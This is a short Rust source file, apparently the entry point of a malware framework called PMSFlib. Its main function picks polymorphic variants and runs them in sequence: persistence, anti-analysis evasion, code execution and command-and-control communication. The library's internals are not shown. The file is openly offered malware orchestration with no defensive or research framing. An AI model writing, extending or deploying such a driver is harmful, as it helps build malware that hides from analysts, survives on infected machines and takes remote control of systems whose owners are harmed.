use PMSFlib::{
    establish_persistence_poly, perform_anti_analysis_poly, execute_code_poly, communicate_c2_poly
};

fn main() {
    let persistence = establish_persistence_poly();
    println!("Selected persistence: {}", std::any::type_name_of_val(&*persistence));
    persistence.establish_persistence().unwrap();

    let anti_analysis = perform_anti_analysis_poly();
    println!("Selected anti-analysis: {}", std::any::type_name_of_val(&*anti_analysis));
    anti_analysis.perform_anti_analysis().unwrap();

    let execution = execute_code_poly();
    println!("Selected execution: {}", std::any::type_name_of_val(&*execution));
    execution.execute_code().unwrap();

    let c2 = communicate_c2_poly();
    println!("Selected C2: {}", std::any::type_name_of_val(&*c2));
    c2.communicate_c2().unwrap();
} 